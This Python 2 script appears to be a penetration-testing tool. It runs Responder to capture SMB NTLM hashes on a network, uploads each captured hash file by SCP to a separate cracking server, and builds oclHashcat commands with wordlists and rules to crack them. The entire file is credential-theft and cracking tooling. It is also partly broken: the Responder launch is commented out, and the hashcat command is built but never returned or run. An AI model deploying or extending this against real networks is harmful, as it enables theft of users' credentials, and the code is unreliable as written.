#!/usr/bin/env python

from scp import SCPClient
import string
import multiprocessing
import random
import paramiko
import getpass
import re
import time
import os
import signal
import trollius
import argparse
import sys
import subprocess

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()
#    parser.add_argument("-d", "--directory", help="Enter the directory that Responder is in")
    return parser.parse_args()

def launch_responder():
    '''
    Launches Responder
    '''
    DN = open(os.devnull, 'w')
    cmd = 'python Responder.py -I eth0'
    print '[*] Running: {}'.format(cmd)
    rspndr = subprocess.Popen(cmd.split(), stdout=DN, stderr=DN, preexec_fn=os.setsid)
    #out,err = process.communicate()
    return rspndr

def get_user_creds():
    user = raw_input('LDAP username for connecting to Crackerbox: ')
    pw = getpass.getpass()
    return user, pw

def parse_resp_output(hash_files):
    new_hash_files = []

    for f in os.listdir("logs"):
        if f not in hash_files:
            if 'SMB-NTLM' in f:
                new_hash_files.append(f)

    return new_hash_files

def ssh_client(server, port, user, pw):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(server, port, user, pw)
    return client

def make_hashcat_cmd(hash_file, user):
    ran_str = ''.join(random.choice(string.letters) for x in range(5))
    identifier = user+'-'+ran_str
    hashcat_cmd  = '/opt/oclHashcat-1.36/oclHashcat64.bin --session {}'.format(identifier)
    hashcat_cmd += ' -m {} '
    hashcat_cmd += '-o {} /tmp/{} /opt/wordlists/* -r /opt/oclHashcat-1.36/rules/best64.rule'.format(identifier, hash_file)
    match = re.match('SMB-NTLM(v1|v2)', hash_file)
    if match:
        hashtype = match.group()
        if hashtype == 'SMB-NTLMv1':
            hashcat_cmd = hashcat_cmd.format('5500')
        elif hashtype == 'SMB-NTLMv2':
            hashcat_cmd = hashcat_cmd.format('5600')

        print hashcat_cmd

def main(args):

    # Root check
    if os.geteuid() != 0:
        sys.exit('[-] Please run as root')

    user, pw = get_user_creds()
    hash_files = []
    sent_hashes = []

    #Launch responder
    #rspndr = launch_responder()
    ssh = ssh_client('10.0.0.240', 22, user, pw)
    scp = SCPClient(ssh.get_transport())
    remote_path = '/tmp/{}'
    loc_path = os.getcwd()+'/logs/{}'

    try:
        while 1:
            time.sleep(1)
            new_hash_files = parse_resp_output(hash_files)
            hash_files = hash_files + list(set(new_hash_files) - set(hash_files))
            unsent = [h for h in hash_files if h not in sent_hashes]
            for u in unsent:
                hashcat_cmd = make_hashcat_cmd(u, user)
                scp.put(loc_path.format(u), remote_path.format(u))
                sent_hashes.append(u)

    except KeyboardInterrupt:
        print '[*] Killing Responder'
        os.killpg(rspndr.pid, signal.SIGTERM)
        print 'done'

main(parse_args())
